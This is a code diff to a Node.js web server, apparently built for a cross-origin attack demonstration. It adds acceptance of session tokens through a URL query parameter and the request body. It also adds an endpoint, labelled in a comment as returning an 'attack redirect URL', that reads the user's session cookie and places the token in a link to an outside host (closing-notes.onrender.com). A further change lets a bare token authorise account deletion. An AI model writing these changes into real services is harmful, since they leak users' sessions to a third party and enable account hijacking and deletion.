@@ -103,10 +103,11 @@ http.createServer(async (req, res) => {
   }
 
   // ── GET /api/session — returns current logged-in user ────────────────
+  // Accepts session via cookie OR ?tok= query param (for cross-origin use)
   if (req.method === 'GET' && path === '/api/session') {
     setCorsSession(res, origin);
-    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }
-    const sess = getSession(req);
+    const urlTok = url.searchParams.get('tok');
+    let sess = urlTok ? (sessions.get(urlTok) && sessions.get(urlTok).expiresAt > Date.now() ? sessions.get(urlTok) : null) : getSession(req);
     if (!sess) { res.writeHead(401, { 'Content-Type': 'application/json' }); return res.end(JSON.stringify({ loggedIn: false })); }
     const account = users.get(sess.email) || {};
     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -116,6 +117,18 @@ http.createServer(async (req, res) => {
   if (req.method === 'OPTIONS' && path === '/api/session') {
     setCorsSession(res, origin);
     res.writeHead(204); return res.end();
+  }
+
+  // ── GET /api/link — returns attack redirect URL with session token ────
+  // Used by /cuenta to build the cross-origin archive link
+  if (req.method === 'GET' && path === '/api/link') {
+    const cookie = req.headers.cookie || '';
+    const m = cookie.match(/(?:^|;\s*)pliego_session=([a-f0-9]{64})/);
+    const tok = m?.[1];
+    if (!tok || !sessions.has(tok)) return reply(res, 401, 'Not logged in.');
+    const target = 'https://closing-notes.onrender.com/pliego-archive.html#tok=' + tok;
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    return res.end(JSON.stringify({ url: target }));
   }
 
   // ── POST /api/login ───────────────────────────────────────────────────
@@ -207,8 +220,18 @@ http.createServer(async (req, res) => {
   // ── POST /api/eliminar — session-based deletion ───────────────────────
   if (req.method === 'POST' && path === '/api/eliminar') {
     try {
-      // Identify user by session (cross-site iframe sends SameSite=None cookie)
-      const sess = getSession(req);
+      // Identify user by cookie OR explicit token in body (cross-origin token flow)
+      let sess = getSession(req);
+      if (!sess) {
+        try {
+          const bodyRaw = await readBody(req, 256);
+          const bodyData = JSON.parse(bodyRaw);
+          if (bodyData.token) {
+            const entry = sessions.get(bodyData.token);
+            if (entry && entry.expiresAt > Date.now()) sess = entry;
+          }
+        } catch { /* no body or bad JSON */ }
+      }
       if (!sess) return reply(res, 401, 'Not logged in. Please sign in to delete your account.');
       const recipient = sess.email;
       if (!users.has(recipient)) return reply(res, 404, 'Account not found.');
